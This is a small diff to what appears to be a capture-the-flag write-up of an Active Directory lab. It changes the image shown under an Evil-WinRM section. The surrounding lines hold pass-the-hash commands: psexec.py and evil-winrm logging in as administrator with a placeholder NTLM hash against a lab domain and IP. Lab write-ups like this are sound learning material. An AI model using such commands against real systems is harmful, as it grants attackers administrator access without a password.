@@ -170,7 +170,7 @@ psexec.py -hashes “inserthasheshere” administrator@spookysec.local
 
 #### __Evil-WinRM__
 
-{{< figure src="/attacktive/psexec.jpg" title="" >}}
+{{< figure src="/attacktive/evilwinrm_inserthash.png" title="" >}}
 
 ```bash
  evil-winrm -u administrator -H “inserthashhere” -i 10.10.68.12
